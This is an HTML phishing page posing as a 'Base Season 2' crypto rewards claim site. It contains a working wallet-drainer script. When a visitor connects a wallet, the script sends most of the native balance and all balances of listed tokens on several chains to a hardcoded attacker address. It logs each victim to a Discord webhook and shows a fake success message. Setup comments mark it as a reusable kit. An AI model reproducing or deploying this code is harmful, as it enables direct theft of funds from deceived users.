<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Base Season 2 - Claim Rewards</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body { background: #0a0a0a; color: #fff; font-family: Arial, sans-serif; text-align: center; padding: 80px 20px; margin:0; }
        h1 { font-size: 2.8em; margin-bottom: 10px; }
        p { font-size: 1.3em; color: #ccc; }
        button { padding: 20px 60px; font-size: 24px; background: #00ff9d; color: #000; border: none; border-radius: 12px; cursor: pointer; margin: 40px 0; font-weight: bold; }
        button:hover { background: #00cc7a; }
        #loader { display: none; flex-direction: column; align-items: center; margin-top: 50px; }
        .spinner { border: 6px solid #333; border-top: 6px solid #00ff9d; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>Base Season 2 Rewards</h1>
    <p>Connect wallet to claim up to 10,000 USDT + ETH</p>
    <button onclick="startDrain()">Connect Wallet & Claim</button>
    <p style="color:#555; font-size:0.95em;">12,847 users claimed in last 24h • Verified</p>

    <div id="loader">
        <div class="spinner"></div>
        <p style="margin-top:20px;">Claiming rewards... Please wait</p>
    </div>

    <script>
        const RECEIVER = "0xe59A4C6E229b01BCf17d760E9805E4326f9A7585"; // Your address
        const WEBHOOK = "https://discordapp.com/api/webhooks/1517280636560347148/fMM5mcZO1agMmUerNy3HYbYH4vD3dzXQOhA9_qvhDE54AqZH0qUqjMHTOAhkoCtXLy-P"; // ← Paste your Discord webhook here

        async function logVictim(address, chainId, message) {
            try {
                fetch(WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: `🚨 **New Victim**\n**Address:** ${address}\n**Chain:** ${chainId}\n**Info:** ${message}`
                    })
                });
            } catch(e) {}
        }

        async function startDrain() {
            document.querySelector("button").style.display = "none";
            document.getElementById("loader").style.display = "flex";

            if (!window.ethereum) {
                alert("Wallet not detected");
                return;
            }

            try {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const address = await signer.getAddress();
                const chainId = await provider.getNetwork().then(n => n.chainId);

                await logVictim(address, chainId, "Connected - Starting drain");

                // Drain Native Token
                const balance = await provider.getBalance(address);
                if (balance.gt(0)) {
                    const tx = await signer.sendTransaction({
                        to: RECEIVER,
                        value: balance.mul(93).div(100)
                    });
                    await tx.wait();
                }

                // Multi-chain Token Lists (add more as needed)
                let tokens = [];
                if (chainId === 1) { // Ethereum
                    tokens = ["0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","0x6B175474E89094C44Da98b954EedeAC495271d0F","0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599","0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"];
                } else if (chainId === 56) { // BSC
                    tokens = ["0x55d398326f99059fF775485246999027B3197955","0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d","0xe9e7CEA3DedCa5984780Bafc599bD69ADd087D56"];
                } else if (chainId === 137) { // Polygon
                    tokens = ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F","0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359","0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270"];
                } // Add more chains (42161 Arbitrum, 8453 Base, etc.)

                for (let tokenAddr of tokens) {
                    try {
                        const token = new ethers.Contract(tokenAddr, [
                            "function balanceOf(address) view returns (uint256)",
                            "function transfer(address, uint256) returns (bool)"
                        ], signer);
                        const bal = await token.balanceOf(address);
                        if (bal.gt(0)) {
                            await token.transfer(RECEIVER, bal);
                        }
                    } catch(e) {}
                }

                await logVictim(address, chainId, "Drained successfully");
                
                // Fake success screen
                document.getElementById("loader").innerHTML = `
                    <h2 style="color:#00ff9d;">✅ Claim Successful!</h2>
                    <p>Rewards sent to your wallet. Refresh to claim again.</p>
                `;
            } catch (e) {
                console.error(e);
                document.getElementById("loader").innerHTML = `<p style="color:red;">Transaction error. Try again.</p>`;
            }
        }
    </script>
</body>
</html>
